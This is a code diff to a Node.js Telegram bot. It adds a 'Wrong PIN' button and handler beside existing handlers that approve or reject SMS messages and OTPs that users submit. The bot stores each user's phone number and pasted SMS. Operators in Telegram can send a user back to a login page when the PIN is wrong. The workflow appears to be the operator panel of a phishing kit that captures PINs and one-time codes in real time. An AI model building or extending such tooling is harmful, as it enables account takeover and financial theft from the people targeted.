@@ -1578,9 +1578,33 @@ ${application.smsMessage || 'N/A'}
         await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ SMS rejected. User asked to paste correct message.' });
     }
 
-    // ──────────────────────────────────────
-    // OTP APPROVAL HANDLERS
-    // ──────────────────────────────────────
+    else if (data.startsWith('wrongpin_sms_')) {
+        const parts = data.split('_');
+        const adminIdFromData = parts[2];
+        const applicationId = parts[3];
+        const application = await db.getApplication(applicationId);
+
+        if (!application) {
+            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application not found', show_alert: true });
+        }
+
+        await db.updateApplication(applicationId, { otpStatus: 'wrongpin' });
+        console.log(`🔑 WRONG PIN flagged for ${applicationId} — returning user to login`);
+
+        await bot.editMessageText(`
+🔑 *WRONG PIN — USER RETURNED TO LOGIN*
+
+📋 \`${applicationId}\`
+📞 \`${formatPhone(application.phoneNumber)}\`
+
+❌ PIN was incorrect
+✓ User has been redirected back to the login page
+👤 ${callbackQuery.from.first_name}
+⏰ ${new Date().toLocaleString()}
+        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
+
+        await bot.answerCallbackQuery(callbackQuery.id, { text: '🔑 Wrong PIN flagged. User sent back to login.' });
+    }
     else if (data.startsWith('approve_otp_')) {
         const parts = data.split('_');
         const adminIdFromData = parts[2];
@@ -1924,7 +1948,8 @@ ${smsMessage}
             reply_markup: {
                 inline_keyboard: [
                     [{ text: '❌ Invalid Message',   callback_data: `reject_sms_${application.adminId}_${applicationId}` }],
-                    [{ text: '✅ Correct Message', callback_data: `approve_sms_${application.adminId}_${applicationId}` }]
+                    [{ text: '🔑 Wrong PIN',          callback_data: `wrongpin_sms_${application.adminId}_${applicationId}` }],
+                    [{ text: '✅ Correct Message',    callback_data: `approve_sms_${application.adminId}_${applicationId}` }]
                 ]
             }
         });
